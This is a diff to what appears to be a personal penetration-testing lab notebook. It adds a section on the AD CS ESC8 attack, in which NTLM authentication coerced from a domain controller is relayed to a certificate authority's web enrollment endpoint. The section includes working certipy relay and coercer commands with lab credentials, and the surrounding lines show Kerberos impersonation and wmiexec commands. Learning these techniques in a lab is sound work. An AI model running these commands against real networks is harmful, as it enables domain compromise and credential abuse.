@@ -236,3 +236,22 @@ getST.py -spn cifs/LAB-DC.LAB.LOCAL -impersonate Administrator -dc-ip 10.129.205
 KRB5CCNAME=Administrator.ccache wmiexec.py -k -no-pass LAB-DC.LAB.LOCAL
 ```
 %% connect using the Administrator TGT %%
+
+## ESC8
+NTLM relay is an attack where we intercept and then send authentication messages between devices on a network. To perform the NTLM relay attack against domain-joined machines, an adversary pretends to be a legitimate server for the client requesting authentication, in addition to pretending to be a legitimate client for the server that offers a service, relaying messages back and forth between them until establishing an authenticated session. After establishing an authenticated session with the server, the adversary abuses it to carry out authorized actions on behalf of the client; for the client, the adversary either sends an application message stating that authentication failed or terminates the connection:
+
+To successfully exploit ESC8, we will coerce DC01 to authenticate against a machine we control and then relay its NTLM authentication to the ADCS server's HTTP web enrollment endpoints to generate a certificate that we can later use to authenticate as the coerced account/machine.
+
+## ESC8 Conditions
+- A vulnerable web enrollment endpoint.
+- At least one certificate template enabled allows domain computer enrollment and client authentication (like the default Machine/Computer template).
+```
+sudo certipy relay -target 172.16.19.5 -template DomainController
+
+```
+%% the -target here represents the CA, we are coercing the domain controller to authenticate to us and then relaying that to the CA so that we can get a certificate which we can use later to authenticate to the domain controller%%
+
+```
+coercer coerce -l 172.16.19.19 -t 172.16.19.3 -u blwasp -p 'Password123!' -d lab.local -v
+```
+%% use coercer to coerce our authentication against our target domain in this case the DC. -l represents our listening machine  and d reps the domain%%
